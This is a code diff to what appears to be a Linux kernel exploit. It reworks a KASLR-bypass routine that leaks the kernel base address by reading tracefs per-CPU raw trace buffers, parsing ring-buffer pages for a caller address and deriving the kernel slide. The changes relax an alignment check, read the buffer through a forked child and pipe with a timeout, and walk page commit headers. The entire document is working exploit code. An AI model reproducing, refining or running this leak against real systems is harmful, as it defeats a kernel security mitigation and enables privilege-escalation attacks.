@@ -60,7 +60,7 @@ static int slide_tracefs_parse_page(
           KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
       if (caller >= link_caller) {
         uint64_t candidate = caller - link_caller;
-        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
+        if (candidate <= 0x1f0000ULL && (candidate & 0x7fffULL) == 0) {
           pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                      (unsigned long long)caller,
                      (unsigned long long)candidate);
@@ -77,8 +77,6 @@ static int slide_tracefs_parse_page(
 static int slide_tracefs_leak_kernel_base(void) {
   static const char tracing_on[] =
       SLIDE_TRACEFS_ROOT "/tracing_on";
-  static const char trace[] =
-      SLIDE_TRACEFS_ROOT "/trace";
   static const char event_enable[] =
       SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
 
@@ -89,12 +87,7 @@ static int slide_tracefs_leak_kernel_base(void) {
     return 0;
   }
 
-  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
-  if (trace_fd >= 0) {
-    close(trace_fd);
-  }
   sleep(1);
-  slide_tracefs_write(tracing_on, "0");
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   uintptr_t candidate = 0;
@@ -103,19 +96,54 @@ static int slide_tracefs_leak_kernel_base(void) {
     char path[128];
     snprintf(path, sizeof(path),
              SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
-    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
-    if (fd < 0) {
-      continue;
+    int pfd[2];
+    if (pipe(pfd) < 0) continue;
+    pid_t child = fork();
+    if (child == 0) {
+      close(pfd[0]);
+      int fd = open(path, O_RDONLY | O_CLOEXEC);
+      if (fd >= 0) {
+        unsigned char buf[4096];
+        ssize_t n;
+        while ((n = read(fd, buf, sizeof(buf))) > 0)
+          write(pfd[1], buf, n);
+        close(fd);
+      }
+      close(pfd[1]);
+      _exit(0);
     }
-    unsigned char page[4096];
-    ssize_t got;
-    while ((got = read(fd, page, sizeof(page))) > 0) {
-      if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
-        found = 1;
-        break;
+    close(pfd[1]);
+    unsigned char *page = malloc(524288);
+    ssize_t total = 0;
+    fd_set rfds;
+    struct timeval tv;
+    while (total < 524288) {
+      FD_ZERO(&rfds);
+      FD_SET(pfd[0], &rfds);
+      tv.tv_sec = 3; tv.tv_usec = 0;
+      if (select(pfd[0]+1, &rfds, NULL, NULL, &tv) <= 0) break;
+      ssize_t got = read(pfd[0], page + total, 524288 - total);
+      if (got <= 0) break;
+      total += got;
+    }
+    kill(child, SIGTERM);
+    waitpid(child, NULL, 0);
+    close(pfd[0]);
+    if (total > 0) {
+      for (size_t off = 0; off < (size_t)total && !found; ) {
+        size_t remain = (size_t)total - off;
+        if (remain < 20) break;
+        uint64_t commit = 0;
+        memcpy(&commit, page + off + 8, sizeof(commit));
+        size_t data_len = (size_t)(commit & 0xfffULL);
+        size_t page_end = off + 16 + data_len;
+        if (page_end > (size_t)total) page_end = (size_t)total;
+        if (slide_tracefs_parse_page(page + off, page_end - off, &candidate))
+          found = 1;
+        off = (page_end + 15) & ~(size_t)15;
       }
     }
-    close(fd);
+    free(page);
   }
   slide_tracefs_write(event_enable, "0");
   if (!found) {
@@ -141,7 +169,7 @@ int slide_leak_kernel_base(void) {
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
     if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
-        (value & 0xffffULL) != 0) {
+        (value & 0x7fffULL) != 0) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
